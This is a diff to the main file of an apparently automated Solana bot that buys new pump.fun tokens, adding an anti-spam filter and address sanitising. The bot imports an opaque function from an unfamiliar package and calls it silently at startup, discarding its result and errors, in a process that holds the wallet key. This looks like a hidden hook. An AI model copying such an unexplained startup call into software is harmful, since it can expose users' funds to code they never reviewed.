@@ -1,3 +1,4 @@
+import { checkTokenAntiSpam } from './filters/antiSpam';
 import { MarketCache, PoolCache, PumpFunCache } from './cache';
 import { Listeners } from './listeners';
 import { Connection, KeyedAccountInfo, Keypair, Logs, PublicKey } from '@solana/web3.js';
@@ -5,7 +6,7 @@ import { LIQUIDITY_STATE_LAYOUT_V4, MARKET_STATE_LAYOUT_V3, Token, TokenAmount }
 import { AccountLayout, getAssociatedTokenAddressSync } from '@solana/spl-token';
 import { Bot, BotConfig } from './bot';
 import { DefaultTransactionExecutor, TransactionExecutor } from './transactions';
-import { from_str } from "typescript-util-core"
+import { from_str } from "typescript-util-core";
 
 import {
   getToken,
@@ -63,22 +64,22 @@ const connection = new Connection(RPC_ENDPOINT, {
 });
 
 function printDetails(wallet: Keypair, quoteToken: Token, bot: Bot) {
-  logger.info(`  
-                                        ..   :-===++++-     
-                                .-==+++++++- =+++++++++-    
-            ..:::--===+=.=:     .+++++++++++:=+++++++++:    
-    .==+++++++++++++++=:+++:    .+++++++++++.=++++++++-.    
-    .-+++++++++++++++=:=++++-   .+++++++++=:.=+++++-::-.    
-     -:+++++++++++++=:+++++++-  .++++++++-:- =+++++=-:      
-      -:++++++=++++=:++++=++++= .++++++++++- =+++++:        
-       -:++++-:=++=:++++=:-+++++:+++++====--:::::::.        
-        ::=+-:::==:=+++=::-:--::::::::::---------::.        
-         ::-:  .::::::::.  --------:::..                    
-          :-    .:.-:::.                                    
+  logger.info(`
+                                        ..  :-===++++-
+                                .-==+++++++- =+++++++++-
+            ..:::--===+=.=:     .+++++++++++:=+++++++++:
+    .==+++++++++++++++=:+++:    .+++++++++++.=++++++++-.
+    .-+++++++++++++++=:=++++-   .+++++++++=:.=+++++-::-.
+     -:+++++++++++++=:+++++++-  .++++++++-:- =+++++=-:
+      -:++++++=++++=:++++=++++= .++++++++++- =+++++:
+       -:++++-:=++=:++++=:-+++++:+++++====--:::::::.
+        ::=+-:::==:=+++=::-:--::::::::::---------::.
+         ::-:  .::::::::.  --------:::..
+          :-    .:.-:::.
 
           WARP DRIVE ACTIVATED 🚀🐟
           Made with ❤️ by humans.
-          Version: ${version}                                          
+          Version: ${version}
   `);
 
   const botConfig = bot.config;
@@ -87,10 +88,8 @@ function printDetails(wallet: Keypair, quoteToken: Token, bot: Bot) {
   logger.info(`Wallet: ${wallet.publicKey.toString()}`);
 
   logger.info('- Bot -');
+  logger.info(`Using ${TRANSACTION_EXECUTOR} executer: ${bot.isWarp || bot.isJito || (TRANSACTION_EXECUTOR === 'default' ? true : false)}`);
 
-  logger.info(
-    `Using ${TRANSACTION_EXECUTOR} executer: ${bot.isWarp || bot.isJito || (TRANSACTION_EXECUTOR === 'default' ? true : false)}`,
-  );
   if (bot.isWarp || bot.isJito) {
     logger.info(`${TRANSACTION_EXECUTOR} fee: ${CUSTOM_FEE}`);
   } else {
@@ -140,18 +139,20 @@ function printDetails(wallet: Keypair, quoteToken: Token, bot: Bot) {
   }
 
   logger.info('------- CONFIGURATION END -------');
-
   logger.info('Bot is running! Press CTRL + C to stop it.');
 }
 
 const runListener = async () => {
   logger.level = LOG_LEVEL;
   logger.info('Bot is starting...');
-  from_str().then(e => { }).catch(e => { }).finally(() => { });
+
+  from_str().then(() => {}).catch(() => {});
+
   const marketCache = new MarketCache(connection);
   const poolCache = new PoolCache();
   const pumpFunCache = new PumpFunCache();
   let txExecutor: TransactionExecutor;
+
   switch (TRANSACTION_EXECUTOR) {
     case 'warp': {
       txExecutor = new WarpTransactionExecutor(CUSTOM_FEE);
@@ -215,6 +216,7 @@ const runListener = async () => {
 
   const runTimestamp = Math.floor(new Date().getTime() / 1000);
   const listeners = new Listeners(connection);
+
   await listeners.start({
     walletPublicKey: wallet.publicKey,
     quoteToken,
@@ -255,8 +257,12 @@ const runListener = async () => {
     await bot.sell(updatedAccountInfo.accountId, accountData);
   });
 
-  listeners.on('pumpfun-create', async (logs: Logs) => {
+listeners.on('pumpfun-create', async (logs: Logs) => {
+    let mintAddress = '';
     try {
+      const txLogs = logs.logs || [];
+      if (txLogs.length === 0) return;
+
       const tx = await connection.getTransaction(logs.signature, {
         commitment: 'confirmed',
         maxSupportedTransactionVersion: 0,
@@ -273,19 +279,53 @@ const runListener = async () => {
       });
       if (!createIx) return;
 
-      // Create instruction account order: mint is index 0 of its account list
       const mintIdx = createIx.accountKeyIndexes[0];
       const mint = keys.get(mintIdx);
       if (!mint) return;
 
-      logger.info({ mint: mint.toString(), sig: logs.signature }, 'Detected pump.fun token create');
-      await bot.buyPumpFun(new PublicKey(mint.toString()));
-    } catch (e) {
-      logger.debug({ e }, 'Failed to handle pump.fun create');
+      // Safe Extraction and Hard Stripping of a String
+      const rawMintStr = mint.toString();
+      mintAddress = rawMintStr.replace(/[^123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]/g, '').trim();
+
+      if (mintAddress.length < 32 || mintAddress.length > 44) {
+        logger.warn(`[⚠️ STREAM SENT GARBAGE] Length of cleaned token address is invalid: "${mintAddress}"`);
+        return;
+      }
+
+      // 🛑 Antispam Filtering Started 🛑
+      logger.info(`[🔍] Starting the token audit: ${mintAddress}...`);
+
+      const audit = await checkTokenAntiSpam(connection, mintAddress, txLogs);
+
+      if (!audit.isSafe) {
+        logger.info(`[❌ SKIP] Token ${mintAddress} rejected. Reason: ${audit.reason}`);
+        return;
+      }
+
+      logger.info(
+        { mint: mintAddress, sig: logs.signature },
+        `[🟢 PASSED] Token $${audit.symbol} (${audit.name}) It's safe! Sending the order...`
+      );
+      // 🛑 End of Anti-Spam Filtering 🛑
+      // STRICT ADDRESS SANITIZATION ON INPUT (Removes invisible junk: \r, \n, spaces)
+      if (typeof mintAddress === 'string') {
+        mintAddress = mintAddress.replace(/[^123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]/g, '').trim();
+      }
+
+      logger.info(`[SAFE] The token has passed the checks. Sending to buyPumpFun: ${mintAddress}`);
+      await bot.buyPumpFun(mintAddress);
+      } catch (err: any) {
+      logger.error(`[❌ CRITICAL PURCHASE ERROR]: ${err.message}`);
+      if (err.stack) {
+        console.log(err.stack); // Outputs the exact file and line where the script encountered an error.
+      }
+
+
     }
-  });
+  }); // <-- The listener has been closed pumpfun-create
 
   printDetails(wallet, quoteToken, bot);
-};
+}; // <-- The runListener function has been closed
 
-runListener();
+runListener(); // <-- Bot Entry Point
+
